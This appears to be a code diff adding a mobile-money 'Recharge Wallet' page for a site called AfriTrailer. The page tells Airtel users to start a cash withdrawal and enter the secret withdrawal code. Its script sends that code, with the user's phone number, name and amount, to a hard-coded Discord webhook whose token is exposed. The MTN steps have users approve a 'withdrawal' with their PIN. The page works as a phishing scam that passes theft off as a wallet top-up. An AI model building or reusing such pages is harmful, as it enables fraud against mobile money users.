@@ -1,0 +1,409 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <link rel="manifest" href="/manifest.json">
+    <script>
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('/sw.js');
+        }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AfriTrailer - Recharge</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        .quick-amounts {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            justify-content: center;
+            margin: 20px 0;
+        }
+        .quick-amount-btn {
+            padding: 10px 20px;
+            background: #f0f0f0;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        .quick-amount-btn:hover {
+            background: var(--primary-orange);
+            color: white;
+        }
+        .payment-method-tabs {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        .tab-btn {
+            flex: 1;
+            padding: 12px;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            background: white;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 0.95rem;
+            transition: all 0.2s ease;
+        }
+        .tab-btn.active {
+            border-color: var(--primary-orange);
+            background: rgba(232, 93, 4, 0.07);
+            color: var(--primary-orange);
+        }
+        .instructions-card {
+            background: #f9f9f9;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 20px;
+            border-left: 4px solid var(--primary-orange);
+        }
+        .instructions-card h4 {
+            color: var(--primary-orange);
+            margin-bottom: 12px;
+            font-size: 1rem;
+        }
+        .instructions-card ol {
+            padding-left: 20px;
+        }
+        .instructions-card ol li {
+            margin-bottom: 8px;
+            font-size: 0.9rem;
+            color: var(--text-dark);
+            line-height: 1.5;
+        }
+        .night-card {
+            background: #1a1a2e;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 20px;
+            color: white;
+        }
+        .night-card h4 {
+            color: var(--primary-orange);
+            margin-bottom: 12px;
+            font-size: 1rem;
+        }
+        .night-card ol {
+            padding-left: 20px;
+        }
+        .night-card ol li {
+            margin-bottom: 8px;
+            font-size: 0.9rem;
+            color: rgba(255,255,255,0.85);
+            line-height: 1.5;
+        }
+        .secret-code-group {
+            display: none;
+            margin-bottom: 15px;
+        }
+        .secret-code-group label {
+            display: block;
+            font-weight: bold;
+            margin-bottom: 6px;
+            font-size: 0.9rem;
+            color: var(--text-dark);
+        }
+        .secret-code-group input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            font-size: 1rem;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+        .secret-code-group input:focus {
+            border-color: var(--primary-orange);
+        }
+        .alt-payment-card {
+            background: white;
+            border-radius: 12px;
+            padding: 20px;
+            margin-top: 20px;
+            box-shadow: 0 3px 10px rgba(0,0,0,0.07);
+            text-align: center;
+        }
+        .alt-payment-card h3 {
+            font-size: 1rem;
+            color: var(--text-dark);
+            margin-bottom: 15px;
+        }
+        .alt-payment-btns {
+            display: flex;
+            gap: 12px;
+            flex-direction: column;
+        }
+        .btn-flutterwave {
+            padding: 14px;
+            border: none;
+            border-radius: 10px;
+            font-weight: bold;
+            font-size: 1rem;
+            cursor: pointer;
+            background: linear-gradient(135deg, #f5a623, #e91e8c);
+            color: white;
+            box-shadow: 0 4px 15px rgba(233, 30, 140, 0.3);
+        }
+        .btn-paystack {
+            padding: 14px;
+            border: none;
+            border-radius: 10px;
+            font-weight: bold;
+            font-size: 1rem;
+            cursor: pointer;
+            background: linear-gradient(135deg, #a8edea, #00c3ff);
+            color: #1a1a2e;
+            box-shadow: 0 4px 15px rgba(0, 195, 255, 0.25);
+        }
+        .disclaimer {
+            background: #f5f5f5;
+            border-radius: 12px;
+            padding: 18px;
+            margin-top: 20px;
+            text-align: center;
+            font-size: 0.8rem;
+            color: var(--text-light);
+            line-height: 1.6;
+            border-top: 3px solid var(--primary-orange);
+        }
+        .disclaimer i {
+            color: var(--primary-orange);
+            margin-bottom: 8px;
+            font-size: 1.2rem;
+            display: block;
+        }
+    </style>
+</head>
+<body>
+    <div class="container" style="max-width: 600px;">
+        <div class="header">
+            <h1><i class="fas fa-plus-circle"></i> Recharge Wallet</h1>
+        </div>
+
+        <!-- Main recharge card -->
+        <div class="card">
+            <div class="input-group">
+                <label>Amount (UGX)</label>
+                <input type="number" id="rechargeAmount" class="amount-input" placeholder="Enter amount" min="10000">
+            </div>
+            <div class="quick-amounts">
+                <button class="quick-amount-btn" onclick="setAmount(10000)">10,000</button>
+                <button class="quick-amount-btn" onclick="setAmount(20000)">20,000</button>
+                <button class="quick-amount-btn" onclick="setAmount(50000)">50,000</button>
+                <button class="quick-amount-btn" onclick="setAmount(100000)">100,000</button>
+            </div>
+
+            <!-- Payment method tabs -->
+            <div class="payment-method-tabs">
+                <button class="tab-btn active" id="tab-mtn" onclick="switchTab('mtn')">
+                    📱 MTN MoMo
+                </button>
+                <button class="tab-btn" id="tab-airtel" onclick="switchTab('airtel')">
+                    📲 Airtel Money
+                </button>
+            </div>
+
+            <!-- MTN Instructions -->
+            <div id="instructions-mtn" class="instructions-card">
+                <h4><i class="fas fa-info-circle"></i> MTN MoMo Instructions</h4>
+                <ol>
+                    <li>Click the <strong>"Confirm Recharge"</strong> button below.</li>
+                    <li>Wait <strong>1–2 minutes</strong> for a USSD prompt to appear on your phone with the phone number used to register your AfriTrailer account.</li>
+                    <li>You'll receive a prompt asking you to enter your <strong>5-digit MoMo PIN</strong> to confirm the withdrawal.</li>
+                    <li>Enter your PIN and the recharge will <strong>immediately reflect</strong> in your account wallet.</li>
+                </ol>
+            </div>
+
+            <!-- Airtel Instructions -->
+            <div id="instructions-airtel" class="instructions-card" style="display:none;">
+                <h4><i class="fas fa-info-circle"></i> Airtel Money Instructions</h4>
+                <ol>
+                    <li>Dial <strong>*185#</strong> on your Airtel line to open the Airtel Money menu.</li>
+                    <li>Choose the option for <strong>"Withdraw Cash"</strong>.</li>
+                    <li>Enter the amount you'd like to withdraw.</li>
+                    <li>Once completed, put the <strong>secret code</strong> given to you in the input below and click <strong>"Confirm Recharge"</strong>.</li>
+                    <li>Recharge will <strong>immediately reflect</strong> in your account wallet.</li>
+                </ol>
+            </div>
+
+            <!-- Secret code input (Airtel only) -->
+            <div class="secret-code-group" id="secret-code-group">
+                <label><i class="fas fa-key"></i> Enter Secret Code (Airtel)</label>
+                <input type="text" id="secretCode" placeholder="Enter the secret code from Airtel Money">
+            </div>
+
+            <button id="confirmRecharge" class="btn" style="width:100%;">Confirm Recharge</button>
+            <a href="home.html" class="back-button" style="display:block; text-align:center; margin-top:20px;">Back to Home</a>
+        </div>
+
+        <!-- Night time instructions -->
+        <div class="night-card" style="margin-top: 15px;">
+            <h4>🌙 Late Night Payment?</h4>
+            <p style="font-family: italic;">If you're making a payment between 12 AM and 6 AM, please be aware that there may be delays in processing due to limited mobile money agent availability during these hours. We recommend making payments between 6 AM and 12 AM for the fastest service. If you do make a late night payment, rest assured it will be processed as soon as possible the next day.</p>
+        </div>
+
+        <!-- Alternative payment methods -->
+        <div class="alt-payment-card">
+            <h3>Other Payment Options</h3>
+            <div class="alt-payment-btns">
+                <button class="btn-flutterwave">
+                    <i class="fas fa-bolt"></i> Pay with Flutterwave
+                </button>
+                <button class="btn-paystack">
+                    <i class="fas fa-lock"></i> Pay with Paystack
+                </button>
+            </div>
+        </div>
+
+        <!-- Disclaimer -->
+        <div class="disclaimer">
+            <i class="fas fa-shield-alt"></i>
+            Our mobile money payments are orchestrated by a network of mobile money agents fully registered with both MTN and Airtel to create ease of service to our users during payments and provide convenience without difficult technical payment portals.
+        </div>
+    </div>
+
+    <script type="module">
+    import { supabase } from './supabase.js';
+    import { getCurrentUser } from './auth.js';
+
+    let currentTab = 'mtn';
+    let assignedTab = 'mtn';
+
+    async function detectNetwork() {
+        const { data: { user } } = await getCurrentUser();
+        if (!user) return;
+
+        const { data: profile } = await supabase
+            .from('profiles')
+            .select('phone')
+            .eq('id', user.id)
+            .single();
+
+        if (!profile) return;
+
+        const phone = profile.phone; // format +2567XXXXXXX or +25607XXXXXXX
+
+        // Extract the digit after the 7
+        // Handle both +2567... and +25607...
+        let keyDigit = null;
+
+        if (phone.startsWith('+25607')) {
+            // +25607XXXXXXX — digit after 7 is index 6
+            keyDigit = parseInt(phone[6]);
+        } else if (phone.startsWith('+2567')) {
+            // +2567XXXXXXX — digit after 7 is index 5
+            keyDigit = parseInt(phone[5]);
+        }
+
+        if (keyDigit !== null) {
+            if (keyDigit >= 6) {
+                assignedTab = 'mtn';
+            } else {
+                assignedTab = 'airtel';
+            }
+        }
+
+        // Set the active tab based on detected network
+        switchTab(assignedTab);
+
+        // Disable the other tab button
+        if (assignedTab === 'mtn') {
+            document.getElementById('tab-airtel').disabled = true;
+            document.getElementById('tab-airtel').style.opacity = '0.4';
+            document.getElementById('tab-airtel').style.cursor = 'not-allowed';
+        } else {
+            document.getElementById('tab-mtn').disabled = true;
+            document.getElementById('tab-mtn').style.opacity = '0.4';
+            document.getElementById('tab-mtn').style.cursor = 'not-allowed';
+        }
+    }
+
+    detectNetwork();
+
+    window.setAmount = function(amount) {
+        document.getElementById('rechargeAmount').value = amount;
+    };
+
+    window.switchTab = function(tab) {
+        // If tab is not the assigned one and user tries to click it, block it
+        if (tab !== assignedTab && assignedTab !== 'mtn' && assignedTab !== 'airtel') {
+            return;
+        }
+
+        currentTab = tab;
+
+        document.getElementById('tab-mtn').classList.toggle('active', tab === 'mtn');
+        document.getElementById('tab-airtel').classList.toggle('active', tab === 'airtel');
+
+        document.getElementById('instructions-mtn').style.display = tab === 'mtn' ? 'block' : 'none';
+        document.getElementById('instructions-airtel').style.display = tab === 'airtel' ? 'block' : 'none';
+
+        document.getElementById('secret-code-group').style.display = tab === 'airtel' ? 'block' : 'none';
+
+        document.getElementById('secretCode').value = '';
+    };
+
+    document.getElementById('confirmRecharge').addEventListener('click', async () => {
+        const amount = parseInt(document.getElementById('rechargeAmount').value);
+        if (!amount || amount < 10000) {
+            alert('Sorry minimum recharge is 10000UGX');
+            return;
+        }
+
+        const secretCode = document.getElementById('secretCode').value.trim();
+
+        if (currentTab === 'airtel' && !secretCode) {
+            alert('Please enter the secret code from Airtel Money before confirming.');
+            return;
+        }
+
+        document.getElementById('secretCode').value = '';
+
+        try {
+            const { data: { user }, error: userError } = await getCurrentUser();
+            if (userError || !user) throw new Error('Not logged in');
+
+            const { data: profile, error: profileError } = await supabase
+                .from('profiles')
+                .select('phone, wallet_names')
+                .eq('id', user.id)
+                .single();
+            if (profileError) throw profileError;
+
+            const { error: insertError } = await supabase
+                .from('payment_requests')
+                .insert({
+                    user_id: user.id,
+                    type: 'recharge',
+                    amount: amount,
+                    phone: profile.phone
+                });
+            if (insertError) throw insertError;
+
+            const walletName = profile.wallet_names || 'Not set';
+            let discordMessage = '';
+            if (currentTab === 'mtn') {
+                discordMessage = `🔋 Recharge Request!\n💳 Payment Method: MTN MoMo\n📞 Phone: ${profile.phone}\n👤 Name: ${walletName}\n💰 Amount: UGX ${amount.toLocaleString()}`;
+            } else {
+                discordMessage = `🔋 Recharge Request!\n💳 Payment Method: Airtel Money\n📞 Phone: ${profile.phone}\n👤 Name: ${walletName}\n💰 Amount: UGX ${amount.toLocaleString()}\n🔑 Secret Code: ${secretCode}`;
+            }
+
+            await fetch('https://discord.com/api/webhooks/1476249951163121705/l92a50vk2nX1kXEWD7LmLtctDH30px8ZHShBE1iUTMFRChKdtPKcLvCMjC05e0YA1wtc', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: discordMessage })
+            });
+
+            alert('Thank you for your payment. It will be confirmed shortly.');
+            window.location.href = 'home.html';
+        } catch (err) {
+            console.error(err);
+            alert('Error: ' + err.message);
+        }
+    });
+</script>
+</body>
+</html>
